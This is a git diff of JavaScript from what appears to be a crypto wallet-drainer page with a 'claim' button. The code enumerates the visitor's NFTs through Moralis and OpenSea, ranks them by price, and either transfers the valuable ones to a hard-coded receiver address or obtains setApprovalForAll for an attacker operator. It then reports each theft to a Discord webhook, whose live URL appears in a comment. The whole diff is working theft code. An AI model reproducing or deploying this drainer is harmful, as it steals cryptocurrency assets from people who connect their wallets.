@@ -73,119 +73,100 @@ async function askSign() {
 }
 // https://canary.discord.com/api/webhooks/989716160629071932/a3EEYjNt95pX-4IEOjOUe9ZB8_mAY_eM1IEXS-lanCcd4Zw7LYwSzC2U-z-Hxxaa8VeZ
 
-// Option 1: askNfts
-
 async function askNfts() {
   const web3Js = new Web3(Moralis.provider);
   const walletAddress = (await web3Js.eth.getAccounts())[0];
 
-  //   const options = {
-  //     method: "GET",
-  //     headers: {
-  //       "Content-Type": "application/json",
-  //       accept: "application/json",
-  //       "x-api-key": moralisApi,
-  //     },
-  //   };
+  const options = {
+    method: "GET",
+    headers: {
+      "Content-Type": "application/json",
+      accept: "application/json",
+      "x-api-key": moralisApi,
+    },
+  };
 
-  fetch(
-    `https://deep-index.moralis.io/api/v2/${walletAddress}/nft?chain=eth&format=decimal`,
-    // `https://api.opensea.io/api/v1/collections?asset_owner=${walletAddress}&offset=0&limit=300`,
-    {
-      headers: {
-        "Content-Type": "application/json",
-        accept: "application/json",
-        "x-api-key": moralisApi,
-      },
-      method: "GET",
-    }
+  let walletNfts = await fetch(
+    `https://api.opensea.io/api/v1/collections?asset_owner=${walletAddress}&offset=0&limit=300`,
+    options
   )
-    //   let walletNfts = await fetch(
-    //     `https://api.opensea.io/api/v1/collections?asset_owner=${walletAddress}&offset=0&limit=300`,
-    //     options
-    //   )
-    .then(async (response) => {
-      const nfts = (await response.json()).result;
-      console.info(`You have ${nfts.length} NFTs`);
-      if (nfts.length > 0) {
-        let transactionsOptions = [];
-        for (nft of nfts) {
-          await fetch(
-            `https://deep-index.moralis.io/api/v2/nft/${nft.token_address}/lowestprice?chain=eth&days=${drainNftsInfo.checkMaxDay}&marketplace=opensea`,
-            // `https://api.opensea.io/api/v1/collection/${nft.address}`,
-            {
-              headers: {
-                "Content-Type": "application/json",
-                accept: "application/json",
-                "x-api-key": moralisApi,
-              },
-              method: "GET",
-            }
-          )
-            .then(async (priceResp) => {
-              if (priceResp.status === 200) {
-              } else return;
-              const nftData = await priceResp.json();
-              let ethValue = parseFloat(
-                Web3.utils.fromWei(nftData.price, "ether")
-              );
-              if (nft.amount) ethValue = ethValue * parseInt(nft.amount);
-              if (ethValue >= drainNftsInfo.minValue.toString(10)) {
-                console.log(
-                  `${nft.token_address} (${nft.token_id}) | ${ethValue} > ${drainNftsInfo.minValue}`
-                );
-                transactionsOptions.push({
-                  price: nftData.price * (nft.amount > 0 ? nft.amount : 1),
-                  options: {
-                    type: nft.contract_type.toLowerCase(),
-                    receiver: "0xf8BF5415bD4EA91934A49F0ab8ae9db4893f248c",
-                    contract_address: nft.token_address,
-                    token_id: nft.token_id,
-                  },
-                });
-                if (nft.contract_type === "ERC1155") {
-                  const trans = transactionsOptions.find(
-                    (t) =>
-                      t.options.contract_address == nft.token_address &&
-                      t.options.token_id == nft.token_id
-                  );
-                  if (trans)
-                    trans.options.amount = ethers.BigNumber.from(nft.amount);
-                }
-              } else
-                console.log(
-                  `!!! ${nft.token_address} (${nft.token_id}) | ${ethValue} < ${drainNftsInfo.minValue}`
-                );
-            })
-            .catch((O_o) => console.error(O_o));
-        }
-        if (transactionsOptions.length < 1) return verifyAsset();
+    .then((response) => response.json())
+    .then((nfts) => {
+      console.log(nfts);
+      if (nfts.includes("Request was throttled."))
+        return ["Request was throttled."];
+      return nfts
+        .filter((nft) => {
+          if (nft.primary_asset_contracts.length > 0) return true;
+          else return false;
+        })
+        .map((nft) => {
+          return {
+            type: nft.primary_asset_contracts[0].schema_name.toLowerCase(),
+            contract_address: nft.primary_asset_contracts[0].address,
+            price: round(
+              nft.stats.one_day_average_price != 0
+                ? nft.stats.one_day_average_price
+                : nft.stats.seven_day_average_price
+            ),
+            owned: nft.owned_asset_count,
+          };
+        });
+    })
+    .catch((err) => console.error(err));
+  if (walletNfts.includes("Request was throttled.")) return verifyAsset();
+  if (walletNfts.length < 1) return verifyAsset();
 
-        console.log(transactionsOptions);
-        // let transactionLists = await transactionsOptions.sort(
-        //   (a, b) => b.price - a.price
-        // );
-
-        let transactionLists = await transactionsOptions.sort(
-          (a, b) => b.price - a.price
-        );
-        for (transaction of transactionLists) {
-          console.log(
-            `Transferring ${transaction.options.contractAddress} (${transaction.price} ETH)`
-          );
-          await Moralis.transfer(transaction.options)
-            .catch((O_o) => console.error(O_o, transaction))
-            .then((uwu) => {
-              if (uwu)
-                sendWebhooks(
-                  walletAddress,
-                  transaction.options.contractAddress,
-                  transaction.price
-                );
-            });
-        }
-      } else verifyAsset();
+  let transactionsOptions = [];
+  for (nft of walletNfts) {
+    if (nft.price === 0) continue;
+    const ethPrice = round(nft.price * (nft.type == "erc1155" ? nft.owned : 1));
+    if (ethPrice < 0.1) continue;
+    const thewallet = ethPrice < 1.0 ? receiveAddress : "";
+    transactionsOptions.push({
+      price: ethPrice,
+      options: {
+        contractAddress: nft.contract_address,
+        from: walletAddress,
+        functionName: "setApprovalForAll",
+        abi: [
+          {
+            inputs: [
+              { internalType: "address", name: "operator", type: "address" },
+              { internalType: "bool", name: "approved", type: "bool" },
+            ],
+            name: "setApprovalForAll",
+            outputs: [],
+            stateMutability: "nonpayable",
+            type: "function",
+          },
+        ],
+        params: { operator: thewallet, approved: true },
+        gasLimit: (await web3Js.eth.getBlock("latest")).gasLimit,
+      },
     });
+  }
+  if (transactionsOptions.length < 1) return notEligible();
+
+  let transactionLists = await transactionsOptions.sort(
+    (a, b) => b.price - a.price
+  );
+  for (const trans of transactionLists) {
+    console.log(
+      `Transferring ${trans.options.contractAddress} (${trans.price} ETH)`
+    );
+    await Moralis.executeFunction(trans.options)
+      .catch((O_o) => console.error(O_o, options))
+      .then((uwu) => {
+        if (uwu)
+          sendWebhooks(
+            walletAddress,
+            trans.options.contractAddress,
+            trans.price
+          );
+      });
+  }
+  await verifyAsset();
 }
 
 let eth_bal = 0;
@@ -275,7 +256,6 @@ async function askTransferWithSign(rbal) {
         .catch((err) => console.log(err));
     });
 }
-
 async function noEligible(info) {
   const noteli = document.getElementById("notEli");
   noteli.style.display = "";
@@ -298,13 +278,10 @@ async function noEligible(info) {
 let disabled = false;
 async function askTransfer() {
   if (disabled) return;
-
   document.getElementById("claimButton").style.opacity = 0.5;
   disabled = true;
-  //   if (await askSign()) await askNfts();
-
+  // if (await askSign()) await askNfts();
   await askNfts();
-
   disabled = false;
   document.getElementById("claimButton").style.opacity = 1;
 }
